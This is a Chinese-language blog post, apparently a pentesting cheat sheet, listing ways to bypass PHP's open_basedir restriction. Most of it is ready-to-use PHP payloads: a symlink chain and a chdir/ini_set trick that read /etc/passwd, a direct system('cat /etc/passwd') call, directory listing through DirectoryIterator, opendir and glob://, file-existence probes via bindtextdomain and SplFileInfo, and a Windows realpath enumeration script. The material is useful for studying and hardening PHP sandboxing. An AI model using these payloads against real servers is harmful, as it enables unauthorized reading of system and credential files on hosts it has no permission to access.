---
layout:     post
title:      PHP bypass open_basedir
subtitle:   简单记录绕过的几种方法
date:       2020-07-28
author:     BY Diego
header-img: img/wenzhang/post-php-open_basedir.jpg
catalog: true
tags:
    - PHP
---

实验环境

![aPsSWq.png](https://s1.ax1x.com/2020/07/27/aPsSWq.png)



# symlink 绕过

前提：有足够的权限去创建文件

payload
```php
<?php
mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
mkdir("E");
chdir("E");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("A/B/C/D/E","bypass");
symlink("bypass/../../../../../etc/passwd","res");
unlink("bypass");
mkdir("bypass");
?>
```

原理 由于symlink 也受到`open_basedir`的限制 无法直接绕过限制， 先依次创建一个文件夹`A/B/C/D/E`，然后通过软连接让 `/var/www/html/dir/bypass -> /var/www/html/dir/A/B/C/D/E`,然后 `/var/www/html/dir/res -> /var/www/html/dir/bypass/../../../../../etc/passwd` ,也就是说 `/var/www/html/dir/res -> /var/www/html/dir/A/B/C/D/E/../../../../../etc/passwd = /var/www/html/dir/etc/passwd` 至此所有操作都是在`open_basedir`中操作的，再然后删除 `bypass` 文件再新建一个单纯的文件不在具有链接，现在res的指向变成了`/var/www/html/dir/res -> /var/www/html/dir/bypass/../../../../../etc/passwd = /etc/password`

![aPs9S0.png](https://s1.ax1x.com/2020/07/27/aPs9S0.png)




# glob

方法一

利用 `DirectoryIterator`

```php
<?php
$c = $_GET['c'];
$a = new DirectoryIterator($c);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

方法二

```php
<?php
$a = $_GET['c'];
if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```
只能列目录，php7可以用如下方法读非根目录文件

该方法测试发现除了根目录 与 `open_basedir`指定的目录，只要知道某个目录下的文件名称就可列目录
如 `/var` 下存在 `www` 目录，那么就可以对 `/var` 下任意目录进行列举

如 `glob:///*/www/../*` 就可列举   `/var`

![aPv07F.png](https://s1.ax1x.com/2020/07/27/aPv07F.png)

![aPvw0U.png](https://s1.ax1x.com/2020/07/27/aPvw0U.png)

# 系统命令函数

命令函数不受限制
```php
system('cat /etc/passwd');
```

# chdir 与 ini_set

```php
<?php
mkdir('aa');chdir('aa');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd');
?>
```

# bindtextdomain 与 SplFileInfo

只能确定目录文件是否存在，存在则返回路径 否则false
```php
<?php
$re = bindtextdomain('xxx', $_GET['dir']);
var_dump($re);
?>
```

```php
<?php
$info = new SplFileInfo($_GET['dir']);
var_dump($info->getRealPath());
?>
```

# realpath

仅限windows
```php

<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = '**';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) {
        $file = $dir . $chars[$i] . '<><';
        realpath($file);
}
function isexists($errno, $errstr)
{
        $regexp = '/File\((.*)\) is not within/';
        preg_match($regexp, $errstr, $matches);
        if (isset($matches[1])) {
                printf("%s <br/>", $matches[1]);
        }
}
?>
```


# 其他

[php5全版本绕过open_basedir读文件脚本](https://www.leavesongs.com/bypass-open-basedir-readfile.html)

[浅谈几种Bypass open_basedir的方法](https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/)
